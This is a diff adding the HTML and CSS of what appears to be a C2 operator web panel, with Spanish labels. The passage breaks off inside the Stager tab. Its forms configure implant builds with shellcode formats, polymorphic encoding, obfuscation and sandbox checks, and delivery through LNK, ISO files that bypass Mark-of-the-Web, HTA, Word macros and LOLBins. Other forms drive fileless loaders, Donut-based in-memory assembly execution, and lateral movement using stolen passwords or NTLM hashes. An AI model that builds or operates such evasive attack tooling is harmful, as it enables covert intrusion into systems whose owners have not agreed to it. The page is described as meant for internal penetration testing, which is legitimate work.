@@ -1,0 +1,2254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C2</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d0d0d;--bg2:#111111;--bg3:#1a1a1a;--bg4:#222222;
+  --border:#2a2a2a;--border2:#333333;
+  --accent:#00d4ff;--accent2:#0099bb;
+  --green:#44ff88;--red:#ff4444;--yellow:#ffcc00;--orange:#ff8844;
+  --text:#e0e0e0;--text2:#aaaaaa;--text3:#666666;
+  --header-h:38px;--tabbar-h:34px;
+  --font-mono:'Consolas','Monaco','Courier New',monospace;
+  --font-ui:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--font-ui);font-size:13px;overflow:hidden;height:100vh;display:flex;flex-direction:column}
+a{color:var(--accent);text-decoration:none}
+button{cursor:pointer;border:none;outline:none;font-family:var(--font-ui);font-size:12px}
+input,select,textarea{background:var(--bg4);color:var(--text);border:1px solid var(--border2);border-radius:3px;padding:5px 8px;font-family:var(--font-ui);font-size:12px;outline:none}
+input:focus,select:focus,textarea:focus{border-color:var(--accent)}
+select option{background:var(--bg3)}
+/* ── Header (menu bar) ── */
+#header{height:var(--header-h);background:#0a0a0a;border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 14px;gap:14px;flex-shrink:0;z-index:100}
+#logo{font-family:var(--font-mono);font-size:13px;font-weight:700;color:var(--accent);letter-spacing:3px;white-space:nowrap;text-transform:uppercase}
+#logo span{color:var(--text3);font-size:10px;margin-left:8px;letter-spacing:1px}
+.hflex{flex:1}
+#conn-status{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--text2)}
+#conn-dot{width:7px;height:7px;border-radius:50%;background:var(--red);transition:background .3s}
+#conn-dot.ok{background:var(--green)}
+#op-name{font-size:11px;color:var(--text3);padding:0 10px;border-left:1px solid var(--border)}
+/* ── Tab bar (Havoc / CS style — horizontal, below header) ── */
+#tabbar{height:var(--tabbar-h);background:var(--bg2);border-bottom:2px solid var(--border);display:flex;align-items:flex-end;padding:0 6px;flex-shrink:0;z-index:99;gap:1px}
+.nav-btn{height:28px;padding:0 14px;border-radius:4px 4px 0 0;background:transparent;display:flex;align-items:center;gap:6px;color:var(--text3);font-size:12px;font-weight:500;transition:all .12s;position:relative;border:1px solid transparent;border-bottom:none;white-space:nowrap}
+.nav-btn:hover{background:var(--bg3);color:var(--text2)}
+.nav-btn.active{background:var(--bg);color:var(--text);border-color:var(--border);border-bottom-color:var(--bg);margin-bottom:-2px;padding-bottom:2px}
+.nav-btn .badge{background:var(--red);color:#fff;font-size:9px;min-width:14px;height:14px;border-radius:7px;display:flex;align-items:center;justify-content:center;padding:0 3px;line-height:1}
+/* ── Content area ── */
+#content{flex:1;overflow:hidden;display:flex;flex-direction:column;background:var(--bg)}
+.tab-panel{display:none;flex:1;overflow:hidden;flex-direction:column}
+.tab-panel.active{display:flex}
+/* ── Cards / Tables ── */
+.panel{background:var(--bg3);border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.panel-header{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;background:var(--bg2)}
+.panel-title{font-size:12px;font-weight:600;color:var(--text2);text-transform:uppercase;letter-spacing:.5px}
+.panel-body{padding:0;overflow:auto}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{padding:7px 10px;text-align:left;font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border);background:var(--bg2);white-space:nowrap}
+td{padding:7px 10px;border-bottom:1px solid var(--border);color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:200px}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:rgba(255,255,255,.03)}
+tr.selected td{background:rgba(0,212,255,.06)}
+.mono{font-family:var(--font-mono);font-size:11px}
+/* ── Buttons ── */
+.btn{padding:5px 12px;border-radius:4px;font-size:12px;font-weight:500;transition:all .15s;display:inline-flex;align-items:center;gap:5px}
+.btn-primary{background:var(--accent);color:#000}
+.btn-primary:hover{background:var(--accent2)}
+.btn-ghost{background:transparent;color:var(--text2);border:1px solid var(--border2)}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent)}
+.btn-danger{background:transparent;color:var(--red);border:1px solid var(--red)}
+.btn-danger:hover{background:var(--red);color:#fff}
+.btn-sm{padding:3px 8px;font-size:11px}
+/* ── Status dots ── */
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:5px}
+.dot-green{background:var(--green)}
+.dot-yellow{background:var(--yellow)}
+.dot-red{background:var(--red)}
+/* ── Agent console (split pane) ── */
+#agents-panel{flex:1;display:flex;flex-direction:column;overflow:hidden;padding:10px;gap:10px}
+#agents-table-wrap{flex:1 1 0;min-height:0;overflow:auto;position:relative}
+#console-pane{flex:0 0 auto;height:320px;display:none;flex-direction:column;border:1px solid var(--accent2);border-radius:6px;background:var(--bg2)}
+#console-pane.open{display:flex}
+#console-pane.maximized{flex:1 1 0;height:auto}
+#agents-table-wrap.console-hidden{display:none}
+#console-header{padding:6px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:var(--bg3)}
+#console-title{font-family:var(--font-mono);font-size:11px;color:var(--accent)}
+#console-output{flex:1;overflow-y:auto;padding:8px 10px;font-family:var(--font-mono);font-size:11px;line-height:1.5}
+.console-line{display:flex;gap:8px;margin-bottom:3px;word-break:break-all;white-space:pre-wrap}
+.console-ts{color:var(--text3);flex-shrink:0;font-size:10px;padding-top:1px}
+.console-prompt{color:var(--accent);flex-shrink:0}
+.console-cmd{color:var(--text2)}
+.console-out{color:var(--text)}
+.console-err{color:var(--red)}
+#console-input-row{display:flex;align-items:center;padding:6px 10px;border-top:1px solid var(--border);gap:8px}
+#console-prompt-label{color:var(--accent);font-family:var(--font-mono);font-size:11px;white-space:nowrap}
+#console-input{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font-mono);font-size:11px;outline:none}
+/* ── Forms / Modals ── */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:flex;align-items:center;justify-content:center;z-index:500;display:none}
+.modal-overlay.open{display:flex}
+.modal{background:var(--bg3);border:1px solid var(--border2);border-radius:8px;min-width:420px;max-width:600px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+.modal-header{padding:14px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+.modal-title{font-size:13px;font-weight:600;color:var(--text)}
+.modal-close{background:transparent;color:var(--text3);font-size:16px;line-height:1}
+.modal-close:hover{color:var(--text)}
+.modal-body{padding:16px}
+.modal-footer{padding:12px 16px;border-top:1px solid var(--border);display:flex;justify-content:flex-end;gap:8px}
+.form-row{margin-bottom:12px}
+.form-row label{display:block;font-size:11px;color:var(--text2);margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
+.form-row input,.form-row select,.form-row textarea{width:100%}
+.form-row textarea{resize:vertical;min-height:80px;font-family:var(--font-mono);font-size:11px}
+.form-row-inline{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+/* ── Toast notifications ── */
+#toast-container{position:fixed;top:50px;right:16px;z-index:1000;display:flex;flex-direction:column;gap:6px;max-width:320px}
+.toast{background:var(--bg3);border:1px solid var(--border2);border-radius:6px;padding:10px 14px;font-size:12px;box-shadow:0 4px 20px rgba(0,0,0,.5);animation:slideIn .2s ease;display:flex;gap:10px;align-items:flex-start}
+.toast-icon{font-size:14px;flex-shrink:0}
+.toast-msg{flex:1}
+.toast-close{background:transparent;color:var(--text3);font-size:14px;flex-shrink:0;line-height:1}
+@keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
+/* ── Tab toolbar ── */
+.toolbar{display:flex;align-items:center;gap:8px;padding:8px 10px;border-bottom:1px solid var(--border);background:var(--bg2);flex-shrink:0}
+.spacer{flex:1}
+/* ── Listeners ── */
+#listeners-panel{flex:1;overflow:auto;padding:10px}
+/* ── Payloads ── */
+#payloads-panel{flex:1;overflow:auto;padding:10px;display:flex;gap:10px;flex-wrap:wrap;align-content:flex-start}
+.payload-form{flex:1;min-width:320px;max-width:480px}
+.petool-tab{border-radius:3px;font-size:11px;padding:3px 8px}
+.petool-tab.active{background:var(--accent);color:#fff}
+/* payload sub-tabs (Implant / Delivery) */
+.pay-tab-bar{display:flex;gap:2px;margin-bottom:12px;background:var(--bg3);border-radius:4px;padding:2px}
+.pay-tab{flex:1;text-align:center;padding:4px 0;border-radius:3px;font-size:11px;font-weight:500;color:var(--text2);cursor:pointer;transition:all .12s}
+.pay-tab.active{background:var(--bg);color:var(--text);box-shadow:0 1px 3px rgba(0,0,0,.4)}
+/* OPSEC highlight system */
+.opsec-active{border-color:var(--accent)!important;box-shadow:0 0 0 2px rgba(83,130,255,.18)!important}
+.opsec-badge{display:none;font-size:10px;font-weight:600;color:var(--accent);background:rgba(83,130,255,.12);border:1px solid rgba(83,130,255,.35);border-radius:3px;padding:1px 5px;margin-left:6px;vertical-align:middle}
+.opsec-badge.show{display:inline}
+.opsec-hint{font-size:10px;color:var(--accent);margin-top:3px;display:none}
+.opsec-hint.show{display:block}
+.cb-label-opsec{transition:color .15s}
+.cb-label-opsec.opsec-on{color:var(--accent)}
+.result-card{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:10px;font-family:var(--font-mono);font-size:11px;color:var(--green);white-space:pre-wrap;margin-top:10px;max-height:200px;overflow:auto}
+/* ── Stager ── */
+#stager-body{flex:1;overflow:hidden;display:flex;gap:0}
+#stager-config{width:270px;flex-shrink:0;border-right:1px solid var(--border);overflow:auto;padding:14px}
+#stager-cradles{flex:1;overflow:auto;padding:10px;display:flex;flex-direction:column;gap:8px}
+.stager-section-title{font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;margin:12px 0 5px 2px}
+.stager-section-title:first-child{margin-top:0}
+.cradle-card{background:var(--bg2);border:1px solid var(--border);border-radius:5px;overflow:hidden}
+.cradle-head{display:flex;align-items:center;gap:8px;padding:6px 10px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.cradle-title{font-size:11px;font-weight:600;color:var(--text);flex:1}
+.cradle-tag{font-size:9px;font-weight:700;padding:1px 5px;border-radius:2px;text-transform:uppercase;letter-spacing:.4px}
+.tag-smb{background:rgba(255,170,0,.12);color:#ffaa00;border:1px solid rgba(255,170,0,.25)}
+.tag-wmi{background:rgba(83,130,255,.12);color:var(--accent);border:1px solid rgba(83,130,255,.25)}
+.tag-lol{background:rgba(80,200,120,.12);color:var(--green);border:1px solid rgba(80,200,120,.25)}
+.tag-tool{background:rgba(200,100,200,.12);color:#cc88cc;border:1px solid rgba(200,100,200,.25)}
+.cradle-body{position:relative}
+.cradle-cmd{margin:0;padding:9px 10px;font-family:var(--font-mono);font-size:11px;color:var(--green);white-space:pre;overflow-x:auto;line-height:1.55}
+.cradle-copy{position:absolute;top:5px;right:6px;background:var(--bg3);border:1px solid var(--border2);color:var(--text2);font-size:10px;padding:2px 8px;border-radius:3px;cursor:pointer;opacity:0;transition:opacity .15s}
+.cradle-body:hover .cradle-copy{opacity:1}
+.cradle-copy:hover{color:var(--text);border-color:var(--accent)}
+/* ── Loot ── */
+#loot-panel{flex:1;overflow:hidden;display:flex;flex-direction:column}
+.sub-tabs{display:flex;border-bottom:1px solid var(--border);background:var(--bg2);padding:0 10px;flex-shrink:0}
+.sub-tab{padding:8px 14px;font-size:12px;color:var(--text3);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s}
+.sub-tab:hover{color:var(--text2)}
+.sub-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+.sub-panel{display:none;flex:1;overflow:auto;padding:10px}
+.sub-panel.active{display:block}
+/* ── Chat ── */
+#chat-panel{flex:1;display:flex;flex-direction:column;overflow:hidden;padding:10px;gap:10px}
+#chat-messages{flex:1;overflow-y:auto;font-size:12px;padding:8px}
+.chat-msg{margin-bottom:6px;line-height:1.5}
+.chat-sender{color:var(--accent);font-weight:600}
+.chat-ts{color:var(--text3);font-size:10px;margin-left:6px}
+.chat-text{color:var(--text)}
+#chat-input-row{display:flex;gap:8px}
+#chat-input{flex:1}
+/* ── Reports ── */
+#reports-panel{flex:1;overflow:auto;padding:10px}
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;margin-bottom:16px}
+.stat-card{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:14px;text-align:center}
+.stat-num{font-size:28px;font-weight:700;color:var(--accent);font-family:var(--font-mono)}
+.stat-label{font-size:11px;color:var(--text3);margin-top:4px;text-transform:uppercase;letter-spacing:.5px}
+/* ── Logs ── */
+#logs-panel{flex:1;overflow:hidden;display:flex;flex-direction:column}
+#log-list{flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:11px;padding:8px}
+.log-entry{display:flex;gap:10px;padding:2px 4px;line-height:1.5}
+.log-entry:hover{background:rgba(255,255,255,.03)}
+.log-ts{color:var(--text3);flex-shrink:0}
+.log-type{flex-shrink:0;min-width:80px;font-weight:600}
+.log-msg{color:var(--text)}
+.log-AGENT_CHECKIN .log-type{color:var(--green)}
+.log-TASK_RESULT .log-type{color:var(--accent)}
+.log-CHAT .log-type{color:var(--yellow)}
+.log-ERROR .log-type{color:var(--red)}
+.log-LOG .log-type{color:var(--text3)}
+/* ── Search ── */
+.search-box{background:var(--bg4);border:1px solid var(--border2);border-radius:4px;padding:4px 8px;color:var(--text);font-size:12px;width:200px}
+.search-box:focus{border-color:var(--accent);outline:none}
+/* ── Scrollbars ── */
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+::-webkit-scrollbar-thumb:hover{background:var(--text3)}
+/* ── Select all checkbox ── */
+input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
+/* ── Upload area ── */
+.upload-zone{border:2px dashed var(--border2);border-radius:6px;padding:20px;text-align:center;cursor:pointer;color:var(--text3);transition:all .15s}
+.upload-zone:hover,.upload-zone.drag{border-color:var(--accent);color:var(--accent)}
+.upload-zone input[type=file]{display:none}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div id="header">
+  <div id="logo">■ C2 <span>v1.0</span></div>
+  <div class="hflex"></div>
+  <div id="conn-status"><div id="conn-dot"></div><span id="conn-text">Connecting…</span></div>
+  <div id="op-name">operator: gui</div>
+</div>
+
+<!-- Tab bar (horizontal, Havoc/CS style) -->
+<div id="tabbar">
+  <button class="nav-btn active" onclick="showTab('agents')" data-tab="agents">
+    Agents<span class="badge" id="badge-agents" style="display:none">0</span>
+  </button>
+  <button class="nav-btn" onclick="showTab('listeners')" data-tab="listeners">Listeners</button>
+  <button class="nav-btn" onclick="showTab('payloads')" data-tab="payloads">Payloads</button>
+  <button class="nav-btn" onclick="showTab('stager')" data-tab="stager">Stager</button>
+  <button class="nav-btn" onclick="showTab('loot')" data-tab="loot">Loot</button>
+  <button class="nav-btn" onclick="showTab('reports')" data-tab="reports">Reports</button>
+  <button class="nav-btn" onclick="showTab('chat')" data-tab="chat">
+    Chat<span class="badge" id="badge-chat" style="display:none">!</span>
+  </button>
+  <button class="nav-btn" onclick="showTab('logs')" data-tab="logs">
+    Logs<span class="badge" id="badge-logs" style="display:none">!</span>
+  </button>
+</div>
+
+<!-- Content -->
+<div id="content">
+
+    <!-- ── Agents ── -->
+    <div class="tab-panel active" id="tab-agents">
+      <div class="toolbar">
+        <button class="btn btn-ghost btn-sm" onclick="refreshAgents()">↻ Refresh</button>
+        <input class="search-box" id="agent-filter" placeholder="Filter agents…" oninput="renderAgents()">
+        <div class="spacer"></div>
+        <span id="agent-count" style="color:var(--text3);font-size:11px"></span>
+      </div>
+      <div id="agents-panel">
+        <div id="agents-table-wrap" class="panel">
+          <table id="agents-table">
+            <thead>
+              <tr>
+                <th style="width:28px"><input type="checkbox" id="chk-all" onchange="toggleAll(this)"></th>
+                <th>ID</th><th>Hostname</th><th>User</th><th>OS</th><th>IP</th>
+                <th>PID</th><th>Sleep</th><th>Last Seen</th><th>Status</th><th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="agents-tbody"></tbody>
+          </table>
+        </div>
+        <!-- Console pane -->
+        <div id="console-pane">
+          <div id="console-header" ondblclick="toggleConsoleMax()">
+            <span id="console-title">no session</span>
+            <div class="spacer"></div>
+            <button class="btn btn-ghost btn-sm" onclick="clearConsole()">Clear</button>
+            <button class="btn btn-ghost btn-sm" id="console-max-btn" onclick="toggleConsoleMax()" title="Maximizar (Win+Enter)">⤢</button>
+            <button class="btn btn-ghost btn-sm" onclick="closeConsole()">✕</button>
+          </div>
+          <div id="console-output"></div>
+          <div id="console-input-row">
+            <span id="console-prompt-label">c2 »</span>
+            <input id="console-input" type="text" autocomplete="off" spellcheck="false"
+              placeholder="shell whoami  |  ls  |  ps  |  help" onkeydown="consoleKey(event)">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Listeners ── -->
+    <div class="tab-panel" id="tab-listeners">
+      <div class="toolbar">
+        <button class="btn btn-primary btn-sm" onclick="openModal('modal-listener')">+ New Listener</button>
+        <button class="btn btn-ghost btn-sm" onclick="refreshListeners()">↻ Refresh</button>
+        <div class="spacer"></div>
+        <span id="listener-count" style="color:var(--text3);font-size:11px"></span>
+      </div>
+      <div id="listeners-panel">
+        <div class="panel">
+          <table id="listeners-table">
+            <thead>
+              <tr><th>#</th><th>Type</th><th>Port</th><th>Status</th><th>Started</th><th>Actions</th></tr>
+            </thead>
+            <tbody id="listeners-tbody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Payloads ── -->
+    <div class="tab-panel" id="tab-payloads">
+      <div class="toolbar">
+        <span style="color:var(--text3);font-size:11px">Build implants · loaders · delivery</span>
+      </div>
+      <div id="payloads-panel">
+
+        <!-- ── Card 1: Agent Builder ── -->
+        <div class="panel payload-form">
+          <div class="panel-header"><span class="panel-title">Agent Builder</span></div>
+          <div class="panel-body" style="padding:14px">
+
+            <!-- Sub-tab bar -->
+            <div class="pay-tab-bar">
+              <div class="pay-tab active" id="agtab-implant" onclick="setAgentTab('implant')">Implant</div>
+              <div class="pay-tab" id="agtab-delivery" onclick="setAgentTab('delivery')">Delivery</div>
+            </div>
+
+            <!-- Shared: C2 Host/Port/Transport/Sleep/Jitter -->
+            <div class="form-row-inline">
+              <div class="form-row">
+                <label>C2 Host</label>
+                <input id="pay-host" value="127.0.0.1">
+              </div>
+              <div class="form-row">
+                <label>Port</label>
+                <input id="pay-port" value="8080">
+              </div>
+            </div>
+            <div class="form-row">
+              <label>Transport</label>
+              <select id="pay-transport">
+                <option value="http">HTTP</option>
+                <option value="mtls" data-opsec="true">mTLS</option>
+                <option value="dns">DNS</option>
+              </select>
+              <span class="opsec-badge" id="pay-transport-badge">★ OPSEC</span>
+            </div>
+            <div class="form-row-inline">
+              <div class="form-row">
+                <label>Sleep (sec)</label>
+                <input id="pay-sleep" value="60">
+              </div>
+              <div class="form-row">
+                <label>Jitter (%)</label>
+                <input id="pay-jitter" value="20">
+              </div>
+            </div>
+
+            <!-- ── Implant sub-panel ── -->
+            <div id="ag-implant">
+              <div class="form-row">
+                <label>Format</label>
+                <select id="pay-format" onchange="payFormatChange()">
+                  <option value="exe">EXE (Windows agent)</option>
+                  <option value="bin" data-opsec="true">BIN (raw shellcode)</option>
+                  <option value="dll">DLL (reflective)</option>
+                  <option value="linux">ELF (Linux agent)</option>
+                  <option value="html">HTML smuggling</option>
+                </select>
+                <span class="opsec-badge" id="pay-format-badge">★ OPSEC</span>
+              </div>
+              <div class="form-row" id="pay-encrypt-row">
+                <label>Encoding</label>
+                <select id="pay-encrypt" onchange="opsecCheck(this,'pay-encrypt-badge','pay-encrypt-hint')">
+                  <option value="">None</option>
+                  <option value="xor">XOR (key 16B)</option>
+                  <option value="aes">AES-256 GCM</option>
+                  <option value="poly" data-opsec="true">Polymorphic SGN</option>
+                </select>
+                <span class="opsec-badge" id="pay-encrypt-badge">★ OPSEC</span>
+                <div class="opsec-hint" id="pay-encrypt-hint">Stub diferente en cada build — sin firma estática posible.</div>
+              </div>
+              <div style="display:flex;gap:12px;margin-top:8px;flex-wrap:wrap">
+                <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer">
+                  <input type="checkbox" id="pay-garble" onchange="opsecCheckbox(this,'lbl-garble')">
+                  <span class="cb-label-opsec" id="lbl-garble">Garble obfuscation</span>
+                  <span class="opsec-badge" id="garble-badge">★ OPSEC</span>
+                </label>
+                <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer">
+                  <input type="checkbox" id="pay-sandbox">
+                  <span>Sandbox checks</span>
+                </label>
+              </div>
+            </div>
+
+            <!-- ── Delivery sub-panel ── -->
+            <div id="ag-delivery" style="display:none">
+              <div class="form-row">
+                <label>Script type</label>
+                <select id="pay-deliv-format">
+                  <option value="lnk" data-opsec="true">LNK shortcut</option>
+                  <option value="iso" data-opsec="true">ISO + LNK (MOTW bypass)</option>
+                  <option value="hta">HTA (mshta.exe)</option>
+                  <option value="docm">DOCM (Word macro)</option>
+                  <option value="bat">BAT → PS cradle</option>
+                  <option value="ps1">PS1 script</option>
+                  <option value="lolbin">LOLBin (certutil/bits)</option>
+                </select>
+                <span class="opsec-badge" id="deliv-format-badge">★ OPSEC</span>
+              </div>
+              <div class="form-row">
+                <label>Stage URL</label>
+                <input id="pay-deliv-stage" placeholder="http://127.0.0.1:8080">
+                <div class="opsec-hint show" style="display:block">URL donde está hosteado el loader/bin.</div>
+              </div>
+              <div style="display:flex;gap:12px;margin-top:8px">
+                <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer">
+                  <input type="checkbox" id="pay-deliv-garble">
+                  <span>Garble</span>
+                </label>
+              </div>
+            </div>
+
+            <button class="btn btn-primary" onclick="buildPayload()" style="width:100%;margin-top:12px">⚙ Build</button>
+            <div id="pay-result"></div>
+          </div>
+        </div>
+
+        <!-- ── Card 2: Loaders ── -->
+        <div class="panel payload-form">
+          <div class="panel-header">
+            <span class="panel-title">Loaders</span>
+            <span style="font-size:10px;color:var(--text3);margin-left:8px">descarga .bin en runtime · sin payload embebido</span>
+          </div>
+          <div class="panel-body" style="padding:14px">
+            <div class="form-row">
+              <label>Stage URL <span style="color:var(--text3);font-size:10px">(donde está el .bin / .enc)</span></label>
+              <input id="ldr-stage-url" placeholder="http://10.0.0.1:8080">
+            </div>
+            <div class="form-row">
+              <label>Encoding del payload</label>
+              <select id="ldr-encode" onchange="opsecCheck(this,'ldr-encode-badge','ldr-encode-hint')">
+                <option value="">None</option>
+                <option value="xor">XOR</option>
+                <option value="aes">AES-256 GCM</option>
+                <option value="poly" data-opsec="true">Polymorphic SGN</option>
+              </select>
+              <span class="opsec-badge" id="ldr-encode-badge">★ OPSEC</span>
+              <div class="opsec-hint" id="ldr-encode-hint">El loader descargará y decodificará el .bin en memoria.</div>
+            </div>
+            <div class="form-row">
+              <label>Loader</label>
+              <select id="ldr-type" onchange="opsecCheck(this,'ldr-type-badge','ldr-type-hint')">
+                <option value="loader" data-opsec="true">Go — fileless, WinHTTP (~9MB)</option>
+                <option value="loader-c">C — WinHTTP nativo (~50KB)</option>
+                <option value="loader-nim">Nim (~300KB)</option>
+                <option value="lnk" data-opsec="true">LNK — PS cradle</option>
+                <option value="iso" data-opsec="true">ISO + LNK — MOTW bypass</option>
+                <option value="hta">HTA — mshta.exe</option>
+              </select>
+              <span class="opsec-badge" id="ldr-type-badge">★ OPSEC</span>
+              <div class="opsec-hint" id="ldr-type-hint">Fileless: no toca disco. Descarga y ejecuta el shellcode desde RAM.</div>
+            </div>
+            <div style="display:flex;gap:12px;margin-top:8px;flex-wrap:wrap">
+              <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer">
+                <input type="checkbox" id="ldr-garble" onchange="opsecCheckbox(this,'lbl-ldr-garble')">
+                <span class="cb-label-opsec" id="lbl-ldr-garble">Garble (Go loaders)</span>
+                <span class="opsec-badge" id="ldr-garble-badge">★ OPSEC</span>
+              </label>
+            </div>
+            <button class="btn btn-primary" onclick="buildLoader()" style="width:100%;margin-top:12px">⚙ Build Loader</button>
+            <div id="ldr-result"></div>
+          </div>
+        </div>
+
+        <!-- ── Card 3: PE Tools ── -->
+        <div class="panel payload-form">
+          <div class="panel-header">
+            <span class="panel-title">PE Tools</span>
+            <div style="display:flex;gap:2px;margin-left:auto">
+              <button class="btn btn-ghost btn-sm petool-tab active" onclick="setPETool('exec')" id="petab-exec">Execute Assembly</button>
+              <button class="btn btn-ghost btn-sm petool-tab" onclick="setPETool('donut')" id="petab-donut">Donut → .bin</button>
+            </div>
+          </div>
+          <div class="panel-body" id="petool-exec" style="padding:14px">
+            <p style="color:var(--text3);font-size:11px;margin-bottom:12px">Sube un .NET EXE/DLL — Donut lo convierte a shellcode y lo ejecuta en un proceso sacrificial del agente seleccionado.</p>
+            <div class="form-row">
+              <label>Assembly (.exe / .dll)</label>
+              <div class="upload-zone" onclick="document.getElementById('asm-file').click()" id="asm-drop">
+                <input type="file" id="asm-file" accept=".exe,.dll" onchange="asmFileSelected(this)">
+                <span id="asm-label">Click o arrastra un .NET EXE</span>
+              </div>
+            </div>
+            <div class="form-row">
+              <label>Agente destino</label>
+              <select id="asm-agent"><option value="">— seleccionar agente —</option></select>
+            </div>
+            <div class="form-row">
+              <label>Proceso sacrificial (opcional)</label>
+              <input id="asm-proc" placeholder="C:\Windows\System32\dllhost.exe">
+            </div>
+            <button class="btn btn-primary" onclick="execAsm()" style="width:100%">▶ Execute Assembly</button>
+            <div id="asm-result"></div>
+          </div>
+          <div class="panel-body" id="petool-donut" style="padding:14px;display:none">
+            <p style="color:var(--text3);font-size:11px;margin-bottom:12px">Convierte cualquier PE (nativo o .NET) a shellcode PIC. El resultado se guarda en el directorio payloads del servidor.</p>
+            <div class="form-row">
+              <label>Fichero (.exe / .dll)</label>
+              <div class="upload-zone" onclick="document.getElementById('donut-file').click()">
+                <input type="file" id="donut-file" accept=".exe,.dll" onchange="donutFileSelected(this)">
+                <span id="donut-label">Click o arrastra el fichero</span>
+              </div>
+            </div>
+            <button class="btn btn-primary" onclick="donutConvert()" style="width:100%">Convertir a Shellcode</button>
+            <div id="donut-result"></div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+      </div>
+    </div>
+
+    <!-- ── Stager ── -->
+    <div class="tab-panel" id="tab-stager">
+      <div class="toolbar">
+        <span style="color:var(--text3);font-size:11px">Cradles para pentest interno · asume credenciales válidas</span>
+      </div>
+      <div id="stager-body">
+
+        <!-- Config lateral -->
+        <div id="stager-config">
+          <div class="form-row">
+            <label>Target IP / Hostname</label>
+            <input id="st-target" placeholder="10.10.10.5" oninput="stagerUpdate()">
+          </div>
+          <div class="form-row">
+            <label>Domain</label>
+            <input id="st-domain" placeholder="corp.local (vacío = local)" oninput="stagerUpdate()">
+          </div>
+          <div class="form-row">
+            <label>Username</label>
+            <input id="st-user" placeholder="Administrator" oninput="stagerUpdate()">
+          </div>
+          <div class="form-row">
+            <label>Password</label>
+            <input id="st-pass" placeholder="P@ss1!" oninput="stagerUpdate()">
+          </div>
+          <div class="form-row">
+            <label>NTLM Hash <span style="font-size:9px;color:var(--text3)">(deja vacío si usas pass)</span></label>
+            <input id="st-hash" placeholder=":8846f7eaee8fb117ad06bdd830b7586c" oninput="stagerUpdate()">
+          </div>
+          <hr style="border-color:var(--border);margin:10px 0">
+          <div class="form-row">
+            <label>Binario local (Kali)</label>
+            <input id="st-lbin" placeholder="/opt/c2/bin/agent.exe" oninput="stagerUpdate()">
+          </div>
+          <div class="form-row">
+            <label>Ruta remota (Windows)</label>
+            <input id="st-rpath" placeholder="C:\Windows\Temp\svc.exe" oninput="stagerUpdate()">
+          </div>
+          <div class="form-row">
+            <label>Staging URL <span style="font-size:9px;color:var(--text3)">(para LOLBins)</span></label>
+            <input id="st-surl" placeholder="http://10.10.10.1:8080/agent.exe" oninput="stagerUpdate()">
+          </div>
+          <div class="form-row">
+            <label>IP Kali (para SMB server)</label>
+            <input id="st-kaliip" placeholder="10.10.10.1" oninput="stagerUpdate()">
+          </div>
+
+          <hr style="border-color:var(--border);margin:12px 0">
+
+          <!-- Automation -->
+          <div style="font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px">Ejecución automática</div>
+          <div class="form-row">
+            <label>Método</label>
+            <select id="st-method">
+              <option value="smb-wmi">smbclient + wmiexec</option>
+              <option value="smb-atexec">smbclient + atexec</option>
+              <option value="smb-dcom">smbclient + dcomexec</option>
+              <option value="nxe">netexec upload + exec</option>
+              <option value="psexec">psexec (auto-upload)</option>
+              <option value="smbexec">smbexec (shell remota)</option>
+            </select>
+          </div>
+          <div style="display:flex;gap:6px;margin-bottom:10px">
+            <button class="btn btn-ghost btn-sm" style="flex:1" onclick="stagerRun('upload')">⬆ Upload</button>
+            <button class="btn btn-ghost btn-sm" style="flex:1" onclick="stagerRun('exec')">▶ Exec</button>
+            <button class="btn btn-primary btn-sm" style="flex:1" onclick="stagerRun('upload-exec')">⚡ Upload+Exec</button>
+          </div>
+          <div id="st-run-output" style="display:none;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:8px;font-family:var(--font-mono);font-size:10px;color:var(--green);white-space:pre-wrap;max-height:200px;overflow-y:auto;line-height:1.5"></div>
+        </div>
+
+        <!-- Cradle cards -->
+        <div id="stager-cradles">
+
